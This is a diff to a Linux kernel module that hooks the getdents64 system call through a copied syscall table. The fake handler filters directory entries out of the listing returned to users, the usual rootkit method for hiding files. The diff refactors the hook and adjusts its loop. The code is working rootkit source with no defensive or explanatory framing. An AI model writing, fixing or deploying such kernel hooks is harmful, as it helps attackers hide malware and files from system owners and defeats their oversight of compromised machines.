@@ -4,9 +4,11 @@
 #include <linux/uaccess.h>
 #include <linux/string.h>
 #include <linux/dirent.h>
+#include <asm/syscall.h>
 
 #include "fake_syscalls.h"
-#include "hooker.h"
+
+extern sys_call_ptr_t sys_call_table_copy[NR_syscalls];
 
 asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
 {
@@ -30,7 +32,7 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
 
     copy_from_user(buffer, dirent, len);
 
-    for (pos = 0; pos < len;)
+    for (pos = 0; pos < len; pos += curr_len)
     {
         curr_dirent = (struct linux_dirent64 *)(buffer + pos);
         curr_len = curr_dirent->d_reclen;
@@ -39,8 +41,6 @@ asmlinkage long sys_getdents64_fake(const struct pt_regs *regs)
             setback += curr_len;
         else if (setback)
             memcpy((void *)((unsigned long)curr_dirent - setback), curr_dirent, curr_len);
-
-        pos += curr_len;
     }
 
     memset(buffer + len - setback, 0, setback);
